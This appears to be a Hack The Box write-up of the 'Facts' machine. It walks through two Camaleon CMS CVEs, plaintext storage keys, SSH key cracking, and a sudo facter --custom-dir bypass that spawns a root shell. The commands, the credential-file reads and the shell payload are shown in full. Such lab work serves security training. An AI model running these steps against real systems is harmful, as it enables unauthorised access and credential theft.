# HTB Machine: Facts — Full Writeup 🚩

![Image alt](assets/banner.png)

![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Category](https://img.shields.io/badge/Category-Web%20%7C%20PrivEsc-blue)
![OS](https://img.shields.io/badge/OS-Linux-lightgrey)

**Author:** NablaShell
**Date:** 2026-02-15
**Platform:** Hack The Box

This write-up details the exploitation of the **Facts** machine. The journey begins with web fuzzing, leads to exploiting two critical vulnerabilities in the Camaleon CMS for LFI and privilege escalation, and finally leverages misconfigured AWS S3-like storage and a clever `sudo` bypass to achieve root access.

---

## 🛠 Kill Chain Summary

### 1. Reconnaissance & Initial Foothold (LFI)
*   **Initial Access:** Fuzzing the web server revealed an `/admin` panel. Registering a new account disclosed the **Camaleon CMS v2.9.0** version.
*   **Vulnerability:** The version is vulnerable to **CVE-2024-46987**, an authenticated path traversal vulnerability.
*   **Exploitation:** A public exploit script was used to read arbitrary files, confirming the users `trivia` and `william` via `/etc/passwd` and retrieving the `user.txt` flag from William's home directory.

### 2. Lateral Movement (Admin & AWS Credentials)
*   **Vulnerability:** **CVE-2025-2304**, a privilege escalation vulnerability in the same CMS version.
*   **Exploitation:** Using another exploit granted our registered user administrative privileges within the CMS.
*   **Findings:** Inside the admin panel, hardcoded **AWS S3 credentials** were discovered in the Filesystem Settings.
*   **Lateral Movement:** These credentials allowed access to an internal S3 bucket (`s3://internal`), from which William's private SSH key (`id_ed25519`) was stolen and successfully cracked (`dragonballz`), granting SSH access as user `trivia`.

### 3. Privilege Escalation (trivia -> root)
*   **Vector:** The user `trivia` can run `/usr/bin/facter` with `sudo` and no password.
*   **The Twist:** A `sudoers` restriction prevents setting the `FACTERLIB` environment variable, which is the standard method for loading custom facts.
*   **Bypass:** The `facter` binary offers an alternative flag, `--custom-dir`, which allows loading facts from a specified directory without relying on the blocked environment variable.
*   **Payload:** A simple Ruby fact was created in `/tmp` that spawns a shell.
*   **Result:** Executing `sudo /usr/bin/facter pwn --custom-dir /tmp` granted a root shell.

---

##  Detailed Walkthrough

### Step 1: Initial Enumeration

First, I added the target to my `/etc/hosts` file to resolve `facts.htb` to the machine's IP (10.129.3.27). A quick Nmap scan revealed the key entry points:

```bash
└─$ sudo nmap facts.htb -sS -sV --top-ports 20
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-15 18:01 +0500
Nmap scan report for facts.htb (10.129.3.27)
Host is up (2.2s latency).

PORT     STATE  SERVICE       VERSION
22/tcp   open   ssh           OpenSSH 9.9p1 Ubuntu 3ubuntu3.2
80/tcp   open   http          nginx 1.26.3 (Ubuntu)
```

[Only SSH (22) and a web server (80) were open](./assets/nmap.png). The focus was clearly on the web application.

### Step 2: Web Fuzzing and Finding the Admin Panel

Visiting http://facts.htb showed a blog-style site. While exploring, I noticed a search feature. Submitting a few test queries eventually triggered a server error:

```text
We’re sorry, but something went wrong.
If you’re the application owner check the logs for more information.
```

This was a classic sign of a Ruby on Rails or similar application revealing a 500 error. Thinking I might find a way to view those logs, I ran gobuster to enumerate directories. [The server was configured with a wildcard, returning a 200 OK status for non-existent directories](assets/gobuster.png), which made fuzzing difficult.

```bash
gobuster dir -u http://facts.htb -w /usr/share/wordlists/dirb/common.txt -t 50
```

However, by analyzing the response sizes, I could differentiate real endpoints from the noise. Among the results, a clear pattern emerged:

```text
_framework/blazor.webassembly.js (Status: 422) [Size: 8380]
admin                (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
admin.pl             (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
admin.cgi            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
admin.php            (Status: 302) [Size: 0] [--> http://facts.htb/admin/login]
```

The `_framework` endpoint was a red herring, but the `/admin` path and its redirects were a goldmine. Following the redirect led to a login page with an option to register.

### Step 3: Exploiting CVE-2024-46987 (LFI)

After registering with credentials (12341234:12341234), I was logged into a dashboard. At the bottom of the page, a footer revealed the exact version of the Content Management System (CMS):

```text
Copyright © 2015 - 2026 Camaleon CMS. Version 2.9.0
```

A quick search for "Camaleon CMS 2.9.0 vulnerabilities" returned two critical CVEs:

    CVE-2024-46987: An authenticated path traversal vulnerability (CVSS 7.7).
    CVE-2025-2304: An authenticated privilege escalation vulnerability (CVSS 9.4).

I found a public Proof-of-Concept (PoC) for CVE-2024-46987, which allows an authenticated user to download arbitrary files from the server. I used it first to confirm access by reading /etc/passwd and then to grab the user flag.

```bash
# Download the exploit and run it
python3 CVE-2025-2304_Exploit.py -u http://facts.htb -l 12341234 -p 12341234 /etc/passwd
```
![Image alt](assets/passwd.png)
The output confirmed two non-standard users:

```text
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
william:x:1001:1001::/home/william:/bin/bash
```

Next, I retrieved William's user flag:

```bash
python3 CVE-2024-46987.py -u http://facts.htb -l 12341234 -p 12341234 /home/william/user.txt
1284019ced61c1854828a1b29e58c1fb
```

### Step 4: Exploiting CVE-2025-2304 (PrivEsc to Admin)

Having the user flag wasn't enough; I needed a way to move laterally. The second CVE, CVE-2025-2304, was perfect. This vulnerability allows any authenticated user to escalate their privileges to administrator by manipulating the password change request.

```bash
└─$ python3 exploit.py http://facts.htb 12341234 12341234
[*] Logging in as 12341234...
[+] Login successful!
[*] User ID: 6
[*] Sending exploit...
[+] Exploit successful! Logout and login again for admin privileges.
```

After logging out and back in with the same credentials, I now had full administrative access to the Camaleon CMS.

### Step 5: Finding the AWS Keys

With admin access, I started poking around the settings. Under Settings -> General Site -> Filesystem Settings, I found a configuration for cloud storage. The CMS was configured to use an S3-compatible service, and the credentials were hardcoded right there in plain text!

```text
Access Key ID: AKIA7A69363C0BD29E9E
Secret Key: ry/bKd9ycFEicrjCMPYupNfU8y+BIR7q+1SL8Ju4
```

These weren't for the main AWS cloud, but for a private, internal S3 instance likely running on the server itself. I configured the AWS CLI to use these credentials and a custom endpoint URL, which was hinted at in the CMS configuration.

![Image alt](assets/aws_config.png)

### Step 6: Dumping the S3 Bucket and Cracking the SSH Key

I attempted to list the available buckets. The endpoint was http://facts.htb:54321. I successfully listed the contents of a bucket named internal.

```bash
└─$ aws --profile facts --endpoint-url http://facts.htb:54321 s3 ls s3://internal/
                           PRE .bundle/
                           PRE .cache/
                           PRE .ssh/
2026-01-08 23:45:13        220 .bash_logout
2026-01-08 23:45:13       3900 .bashrc
...
```

The presence of a .ssh directory was a jackpot. I downloaded the private key file.

```bash
└─$ aws --profile facts --endpoint-url http://facts.htb:54321 s3 cp s3://internal/.ssh/id_ed25519 .
download: s3://internal/.ssh/id_ed25519 to ./id_ed25519
```

I tried to use the key to SSH as william and trivia. Connecting as william still asked for a password, but connecting as trivia prompted for a passphrase. The key was encrypted.

I used ssh2john and John the Ripper to crack the passphrase.

```bash
python3 /usr/share/john/ssh2john.py id_ed25519 > key.hash
john key.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

After a few moments, John successfully cracked the passphrase: dragonballz.

### Step 7: SSH Access as trivia

With the passphrase in hand, I connected to the machine as trivia.

```bash
ssh -i id_ed25519 trivia@facts.htb
# Enter passphrase: dragonballz
trivia@facts:~$
```

### Step 8: Privilege Escalation to Root

My first step was always to check sudo privileges.

```bash
trivia@facts:~$ sudo -l
Matching Defaults entries for trivia on facts:
    env_reset, mail_badpass,
    secure_path=..., use_pty

User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

facter is a command-line tool that gathers and displays system information. Crucially, it allows users to create and load their own "custom facts" written in Ruby.

The standard way to load custom facts is to set the FACTERLIB environment variable to a directory containing .rb files. I tried the obvious method:

```bash
trivia@facts:~$ echo 'Facter.add(:pwn) { setcode { system("/bin/bash") } }' > /tmp/exploit.rb
trivia@facts:~$ sudo FACTERLIB=/tmp /usr/bin/facter pwn
sudo: sorry, you are not allowed to set the following environment variables: FACTERLIB
```

The sudoers configuration explicitly blocked setting the FACTERLIB variable. This was a dead end, but not for long.

I checked the facter man page or help section (mentally, or by running facter --help locally in my mind). It revealed an alternative flag: --custom-dir. This flag does the exact same thing as the FACTERLIB variable but as a command-line argument, which is not blocked by the sudoers restriction.

This was the bypass.

I created the same simple Ruby script to spawn a shell.

```bash
trivia@facts:~$ echo 'Facter.add(:pwn) { setcode { system("/bin/bash") } }' > /tmp/pwn.rb
trivia@facts:~$ sudo /usr/bin/facter pwn --custom-dir /tmp
```

And just like that, I was root.

![Image alt](assets/root_flag.png)

---

![Image alt](assets/banner.png)

🏁 Conclusion

The "Facts" machine was a fantastic journey through a realistic web application attack chain. It highlighted several key lessons:

    Never trust version numbers: Outdated software, especially CMSs, are a goldmine of vulnerabilities.
    Fuzz with intelligence: When facing wildcard responses, filtering by size is more effective than just relying on status codes.
    Credentials in plaintext are a death sentence: The hardcoded AWS keys were the critical link between the web app and system access.
    Always read the manual: When a standard method is blocked (FACTERLIB), check for alternative options (--custom-dir). A simple bypass can lead to full system compromise.

This box was a solid Easy and a great learning experience in chaining multiple exploits to get from a simple web page to root.
